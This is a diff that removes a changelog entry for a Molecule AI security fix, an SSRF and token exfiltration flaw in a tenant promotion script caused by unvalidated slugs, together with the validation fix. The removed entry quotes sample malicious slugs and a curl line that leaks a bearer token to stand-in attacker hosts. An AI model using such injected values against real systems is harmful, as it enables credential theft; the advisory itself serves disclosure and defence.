@@ -9,34 +9,6 @@ This page documents security fixes shipped in the Molecule AI platform. Each ent
 
 ---
 
-## 2026-05-14 — OFFSEC-006: Tenant Slug SSRF + Token Exfiltration in `promote-tenant-image.sh`
-
-**Severity:** High (CWE-918 SSRF + CWE-20 Input Validation)
-**PR:** [#933](https://git.moleculesai.app/molecule-ai/molecule-core/pull/933)
-**Affected:** `scripts/promote-tenant-image.sh` — tenant slug interpolation into URLs and ECR identifiers
-**Full advisory:** [OFFSEC-006: Tenant Slug SSRF + Token Exfiltration](/docs/security/offsec-006-slug-ssrf-advisory)
-
-### Vulnerability
-
-Tenant slugs were interpolated directly into URL paths (`cp_redeploy_tenant`, `tenant_buildinfo`, `tenant_health`, `resolve_tenant_instance_id`) and ECR repository identifiers without validation. A malicious slug such as `?url=https://attacker.com&token=$CP_TOKEN` could be passed to `promote-tenant-image.sh`, causing:
-1. **SSRF** — the slug injected as a URL authority or path segment, redirecting the platform's HTTP call to an attacker-controlled host.
-2. **Token exfiltration** — `curl ?url=https://evil.com&token=$CP_TOKEN` causes the platform's bearer token to appear in the attacker-controlled server's access logs.
-
-Additionally, bash glob metacharacters (`*`, `?`, `[`) in slug values were subject to pathname expansion, allowing a slug like `evil?url=https://attacker.com` to expand to a list of filenames before being passed to curl.
-
-### Fix
-
-Two-layer defence:
-
-1. **`set -f`** (line 57): disables glob expansion before any slug is used, so `*`, `?`, and `[` are treated as literal characters.
-2. **`validate_slug()`** (new function): RFC-1123 regex validation (`^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$`) rejects any slug that does not match the tenant naming standard before any network call is issued. Invalid slugs exit with code 64.
-
-### User-facing summary
-
-Tenant promotion scripts now validate all tenant slug values against RFC-1123 before making any HTTP call or referencing the slug in an ECR identifier. Malformed slugs are rejected immediately with a descriptive error.
-
----
-
 ## 2026-05-13 — CWE-22: Path Traversal Regression in `org_import.go`
 
 **Severity:** High (CWE-22)
